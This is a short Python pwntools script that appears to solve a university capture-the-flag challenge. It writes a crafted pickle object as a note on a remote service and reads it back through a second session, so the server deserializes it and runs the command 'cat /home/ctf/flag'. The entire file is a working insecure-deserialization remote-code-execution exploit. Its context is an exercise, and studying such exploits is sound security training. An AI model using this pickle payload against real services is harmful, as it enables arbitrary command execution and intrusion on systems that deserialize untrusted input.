from pwn import *
from random import randint
from time import sleep
from re import findall
from pickle import dumps
import os

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 12203

CMD = "cat /home/ctf/flag"
USER = str(randint(2 ** 27, 2 ** 28))
NOTE = str(randint(2 ** 27, 2 ** 28))

class PickleRce(object):
    def __reduce__(self):
        return (os.system, (CMD,))
DATA = dumps(PickleRce())

s = [
    remote(SERVER, PORT),
    remote(SERVER, PORT)
]

# In Classy Mode
s[0].sendline(USER)
s[0].sendline('0')

# In Free Mode (Write Note)
s[1].sendline(USER)
s[1].sendline('1')
s[1].sendline('1')
s[1].sendline(NOTE)
s[1].sendline(DATA)
s[1].sendline()

# Wait (Note Writting on Server)
sleep(1)

# In Classy Mode (Read Note)
s[0].sendline('0')
s[0].sendline(NOTE)

print(findall(r"SSof{.*}", s[0].recvall())[0])

s[0].close()
s[1].close()
